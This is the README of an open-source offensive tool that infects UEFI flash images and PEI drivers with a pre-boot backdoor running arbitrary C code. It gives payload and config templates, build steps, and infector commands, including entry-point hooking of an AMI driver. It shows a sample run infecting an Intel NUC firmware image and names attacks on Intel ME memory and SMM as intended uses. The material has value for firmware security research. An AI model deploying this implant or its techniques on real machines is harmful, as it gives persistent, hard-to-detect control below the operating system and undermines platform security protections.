# PEI stage backdoor for UEFI compatible firmware

This project implements early stage firmware backdoor for UEFI based firmware. It allows to execute arbitrary code written in C during Pre EFI Init (PEI) phase of Platform Initialization (PI). This backdoor might be useful for low level manipulations with the target platform configuration when the most of the platform configuration registers are not locked yet.

<img src="https://raw.githubusercontent.com/tianocore/tianocore.github.io/master/images/PI_Boot_Phases.JPG" width="610">

Possible applied use cases:

* Edit values of `REMAPBASE`, `REMAPLIMIT` and other host controller registers during RAM initialization to perform UMA remap attack on Intel Management Engine RAM.
* Lock `TSEGMB` host controller register with the junk value to make System Management Mode code vulnerable to DMA attacks.
* Do other evil things that requires hijacking of early stage platform initialization code.

## Contents <a id="_0"></a>

PEI backdoor project includes:

* [PeiBackdoor.py](https://github.com/Cr4sh/PeiBackdoor/blob/master/PeiBackdoor.py) - Python program that allows to infect raw flash images or individual UEFI PEI drivers with the backdoor code.

* [PeiBackdoor_IA32.efi](https://github.com/Cr4sh/PeiBackdoor/blob/master/PeiBackdoor_IA32.efi), [PeiBackdoor_IA32.pdb](https://github.com/Cr4sh/PeiBackdoor/blob/master/PeiBackdoor_IA32.pdb) - 32-bit PEI backdoor binary compiled with `ACTIVE_PLATFORM = IA32`.

* [PeiBackdoor_X64.efi](https://github.com/Cr4sh/PeiBackdoor/blob/master/PeiBackdoor_X64.efi), [PeiBackdoor_X64.pdb](https://github.com/Cr4sh/PeiBackdoor/blob/master/PeiBackdoor_X64.pdb) - 64-bit PEI backdoor binary compiled with `ACTIVE_PLATFORM = X64`.

* [PeiBackdoor.inf](https://github.com/Cr4sh/PeiBackdoor/blob/master/PeiBackdoor.inf) - PEI backdoor project configuration for EDK2 build environment.

* [config.h](https://github.com/Cr4sh/PeiBackdoor/blob/master/config.h) - PEI backdoor build options.

* [payload.c](https://github.com/Cr4sh/PeiBackdoor/blob/master/payload.c) - Put your own PEI stage code into this source file and call it from `Payload()` function.

* [src/](https://github.com/Cr4sh/PeiBackdoor/blob/master/src) - Rest of the PEI backdoor code.

`PeiBackdoor.py` is using [Capstone engine](http://www.capstone-engine.org/) and [pefile](https://github.com/erocarrera/pefile) Python libraries, you need to install them with `pip install capstone pefile` command.

## Building from the source code <a id="_1"></a>

`payload.c` file with the user supplied PEI stage payload code has the following look:

```cpp
// needed libraries
#include <PiPei.h>
#include <Library/PeimEntryPoint.h>
#include <Library/DebugLib.h>
#include <Library/HobLib.h>

// needed PPIs
#include <Ppi/CpuIo.h>
#include <Ppi/PciCfg.h>
#include <Ppi/MemoryDiscovered.h>

#include "config.h"
#include "payload.h"

// PEI backdoor functions
#include "src/common.h"
#include "src/debug.h"

EFI_STATUS
MemoryDiscoveredCallback(
    EFI_PEI_SERVICES **ppPeiServices,
    EFI_PEI_NOTIFY_DESCRIPTOR *NotifyDescriptor,
    VOID *NullPpi)
{
    // code that needs to be executed after the RAM initialization goes here
    // ...

    return EFI_SUCCESS;
}

static EFI_PEI_NOTIFY_DESCRIPTOR m_MemoryDiscoveredNotify[] =
{
    {
        EFI_PEI_PPI_DESCRIPTOR_NOTIFY_CALLBACK | EFI_PEI_PPI_DESCRIPTOR_TERMINATE_LIST,
        &gEfiPeiMemoryDiscoveredPpiGuid,
        MemoryDiscoveredCallback
    }
};

// main payload function
EFI_STATUS Payload(
    EFI_PEI_FILE_HANDLE FileHandle, 
    CONST EFI_PEI_SERVICES **ppPeiServices)
{
    EFI_STATUS Status = EFI_SUCCESS; 

    if (ppPeiServices)
    {
        // install notify handler that will be called after the main memory init
        if ((Status = (*ppPeiServices)->NotifyPpi(ppPeiServices, m_MemoryDiscoveredNotify)) != EFI_SUCCESS)
        {
            DbgMsg(__FILE__, __LINE__, "NotifyPpi() ERROR 0x%x\r\n", Status);
        }   
    }    

    // code that needs to be executed before the RAM initialization goes here
    // ...

    return EFI_SUCCESS;   
}

```

`config.h` file allows to change some of the backdoor settings:

```cpp
#ifndef _CONFIG_H_
#define _CONFIG_H_

/*
    Enable debug output generated by DbgMsg() function.
    See src/debug.c for more details.
*/
#define BACKDOOR_DEBUG

/*
    Write debug messages into the OVMF debug output port.
    Uncomment this option if you're planning to run the backdoor on QEMU.
*/
// #define BACKDOOR_DEBUG_OVMF

/*
    Write debug messages into the physical memory region specified 
    in BACKDOOR_INFO_ADDR and BACKDOOR_INFO_SIZE.
    Uncomment this option only if you're absolutely sure that backdoor 
    code will be executed after the RAM initialization. Otherwise it
    will make your system unbootable. 
*/
// #define BACKDOOR_DEBUG_MEM

// see src/PeiBackdoor.h for more details
#define BACKDOOR_INFO_ADDR 0x1000
#define BACKDOOR_INFO_SIZE 0x1000

/*
    Write debug messages into the ttyS0 using 0x3F8 I/O port.
    Most likely you will never need this option because COM port of
    modern computers usually connected to PCH via dedicated Super I/O 
    chip and during PEI phase it's not initialized yet.
*/
// #define BACKDOOR_DEBUG_SERIAL

// serial port configuration for BACKDOOR_DEBUG_SERIAL
#define SERIAL_BAUDRATE 115200
#define SERIAL_PORT_NUM SERIAL_PORT_0

#endif
```

To build PeiBackdoor project you need to have a Windows machine with Visual Studio 2008 and [EDK2 source code](https://github.com/tianocore/edk2).

Step by step instruction:

1. Run Visual Studio 2008 Command Prompt and cd to EDK2 directory.

2. Execute `Edk2Setup.bat --pull` command to configure build environment and download required binaries.

3. Execute `git clone git://github.com/Cr4sh/PeiBackdoor.git` command.

4. Edit `Conf/target.txt` file and set `ACTIVE_PLATFORM` property value to the  `OvmfPkg/OvmfPkgX64.dsc` for 64-bit build or to the `OvmfPkg/OvmfPkgIa32.dsc` for 32-bit build. Also you need to set `TARGET_ARCH` property value to the `X64` for 64-bit build or to the `IA32` for 32-bit build.

5. Edit [OvmfPkg/OvmfPkgX64.dsc](https://github.com/tianocore/edk2/blob/master/OvmfPkg/OvmfPkgX64.dsc) and add `PeiBackdoor/PeiBackdoor.inf` path at the end of the `[components]` section.

6. `cd PeiBackdoor && build`

7. After compilation resulting PE image file will be created at `Build/OvmfX64/DEBUG_VS2008x86/X64/PeiBackdoor/PeiBackdoor/OUTPUT/PeiBackdoor.efi` for 64-bit build or at `Build/OvmfX64/DEBUG_VS2008x86/IA32/PeiBackdoor/PeiBackdoor/OUTPUT/PeiBackdoor.efi` for 32-bit build.

## Command line options <a id="_2"></a>

`PeiBackdoor.py` program is used to deploy PEI backdoor, it has the following command line options:

* `-d <path>`, `--driver-image <path>` - Infect existing PEI driver image, both PE and TE formats are supported.

* `-f <path>`, `--flash-image <path>` - Infect existing UEFI flash image. Please note, this option works only for raw flash images (for example, dumped with hardware programer) but _not_ for UEFI capsules with firmware updates.

* `-p <path>`, `--payload <path>` - Path of the PEI backdoor binary for `-d` and `-f` options.

* `-o <path>`, `--output <path>` - Path of the output PEI binary or flash image for `-d` and `-f` options.

If `-d` option was specified - program is appending PEI backdoor binary code to the last section of PEI driver image and hooks it's entry point to execute `BackdoorEntryInfected()` function located in [src/PeiBackdoor.c](https://github.com/Cr4sh/PeiBackdoor/blob/master/src/PeiBackdoor.c) file.

If `-f` option was specified - program is trying to find `SiInitPreMem` PEI driver from AMI by signature in the target flash image and hook it's entry point to execute `BackdoorEntryInfected()` function. This OEM specific driver runs on relatively early stage of platform initialization which allows us to execute arbitrary code from SPI flash even before RAM initialization when the most of the physical memory space configuration registers like `TOUUD`, `TOLUD`, `REMAPLIMIT` and `REMAPBASE` are not configured and not locked yet. To infect other PEI driver entry point you also can edit `SIGNATURE` constant in `PeiBackdoor.py` to specify it's signature.

Instead of `SiInitPreMem` PEI driver entry point patch you also can use `--patch-offs <offset>` command line option to hook arbitrary function of some PEI driver that stored inside firmware image in uncompressed form (for example, AMI based firmware of my Intel NUC is not using any compression for all of it's PEI drivers).

## Running on real hardware <a id="_3"></a>

To run `PeiBackdoor.efi` on your physical machine you need to obtain image of existing PEI driver:

1. Dump motherboard firmware using hardware SPI programmer.

2. Open dumped flash image in [UEFITool](https://github.com/LongSoft/UEFITool) and extract PE/TE image of existing PEI driver that you want to infect with PEI backdoor:

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="https://raw.githubusercontent.com/Cr4sh/blog/master/pei-replace.png" width="650">

... and itfect it using `PeiBackdoor.py`:

1. Infect extracted PE or TE image with `SmmBackdoor_IA32.efi` or `SmmBackdoor_X64.efi` depending on it's architecture: `python PeiBackdoor.py -d image.efi -o image_patched.efi -p PeiBackdoor_X64.efi`

2. Use UEFITool to replace original PE image with `image_patched.efi`, save modified flash image into the file and write it to the motherboard ROM with programmer.

Unfortunately, on some machines (for example my Intel NUC) patched flash image is not working after it's modification with UEFITool, so, I implemented `-f` option for `PeiBackdoor.py` that allows to infect raw firmware image without PEI firmware volue rebuild needed. Here's example of it's usage to infect [SYSKLi35.86A](https://downloadcenter.intel.com/download/26195/BIOS-Update-SYSKLi35-86A-?product=89190) firmware of Skylake based Intel NUC:

```
$ python PeiBackdoor.py -f flash.bin -p PeiBackdoor_IA32.efi -o flash_patched.bin
[+] Target image: flash.bin
[+] Payload: PeiBackdoor.efi
[+] Output file: flash_patched.bin
Target PEI driver is located at offset 0x7246ec
PEI driver image base is 0xfff2454c
PEI driver image stripped size is 0x1c8
PEI driver patch location is at 0x72d47c (6 bytes)
Loader is at offset 0x7de000
Payload is at offset 0x7de040 (entry point RVA is 0x31f)
Target PEI driver was successfully patched
Relocating payload to 0xfffde040
Flash was successfully infected
```

Please note, that I used 32-bit `PeiBackdoor_IA32.efi` backdoor binary because Intel NUC, like lots of others machines with AMI based firmware, has 32-bit PEI phase code (I guess, mostly because it allows to have a bit smaller binaries than x86_64).

## Running on QEMU <a id="_4"></a>

To run PEI backdoor on [QEMU](http://qemu.org/) virtual machine with [OVMF firmware](http://www.linux-kvm.org/page/OVMF) you have to perform the following steps:

1. Edit `config.h` and uncomment `BACKDOOR_DEBUG_OVMF` to see PEI backdoor debug messages generated with `DbgMsg()` function of [src/debug.c](https://github.com/Cr4sh/PeiBackdoor/blob/master/src/debug.c) in OVMF debug output.

2. Execute `build` command from the root directory of EDK2 source code tree to build the whole OVMF firmware for `TARGET_ARCH = X64`, resulting firmware image file will be located at `Build/OvmfX64/DEBUG_VS2008x86/FV/OVMF.fd`

3. Infect [PlatformPei](https://github.com/tianocore/edk2/blob/master/OvmfPkg/PlatformPei) driver of EDK2 with the PEI backdoor: `python PeiBackdoor/PeiBackdoor.py -d Build/OvmfX64/DEBUG_VS2008x86/X64/OvmfPkg/PlatformPei/PlatformPei/OUTPUT/PlatformPei.efi -p PeiBackdoor_X64.efi`

4. Rebuild OVMF firmware image: `GenFds -f OvmfPkg\OvmfPkgX64.fdf -o Build\OvmfX64\DEBUG_VS2008x86 -t VS2008x86 -b DEBUG -p OvmfPkg\OvmfPkgX64.dsc -a X64 -D "EFI_SOURCE=EdkCompatibilityPkg" -D "EDK_SOURCE=EdkCompatibilityPkg" -D "TOOL_CHAIN_TAG=VS2008x86" -D "TOOLCHAIN=VS2008x86" -D "TARGET=DEBUG" -D "WORKSPACE=." -D "EDK_TOOLS_PATH=BaseTools" -D "ARCH=X64" -D "ECP_SOURCE=EdkCompatibilityPkg"`

5. Run QEMU virtual machine: `qemu-system-x86_64 -bios Build/OvmfX64/DEBUG_VS2008x86/FV/OVMF.fd -debugcon file:ovmf_debug.log -global isa-debugcon.iobase=0x402 -hda disk.qcow2 -net nic -m 1024 -gdb tcp:127.0.0.1:1234`

6. Monitor PEI backdoor debug messages in the new terminal window: `tail -f ovmf_debug.log | grep ') :'`

Example of PEI backdoor debug output:

```
PeiBackdoor.c(166) : ******************************
PeiBackdoor.c(167) :   PEI backdoor loaded
PeiBackdoor.c(168) : ******************************
PeiBackdoor.c(171) : Payload image address is 0x8395e0
PeiBackdoor.c(175) : EFI_PEI_SERVICES is at 0x8177f8
payload.c(118) : Host bridge VID:DID is 8086:1237
payload.c(85) : MemoryDiscoveredCallback() called!
payload.c(44) : HOB: type = 0x1
payload.c(44) : HOB: type = 0x7
payload.c(44) : HOB: type = 0x7
payload.c(44) : HOB: type = 0x7
payload.c(44) : HOB: type = 0x7
payload.c(44) : HOB: type = 0x7
payload.c(44) : HOB: type = 0x7
payload.c(44) : HOB: type = 0x7
payload.c(44) : HOB: type = 0x7
payload.c(44) : HOB: type = 0x4
payload.c(44) : HOB: type = 0x4
payload.c(44) : HOB: type = 0x4
payload.c(44) : HOB: type = 0x3
payload.c(50) :  EFI_RESOURCE_SYSTEM_MEMORY: addr = 0x100000, size = 0x1ff00000
payload.c(44) : HOB: type = 0x3
payload.c(50) :  EFI_RESOURCE_SYSTEM_MEMORY: addr = 0x0, size = 0xa0000
payload.c(44) : HOB: type = 0x2
payload.c(44) : HOB: type = 0x2
payload.c(44) : HOB: type = 0x2
payload.c(44) : HOB: type = 0x2
payload.c(44) : HOB: type = 0x2
...

```

******************************************

Written by Dmytro Oleksiuk (aka Cr4sh)

cr4sh0@gmail.com | http://blog.cr4.sh
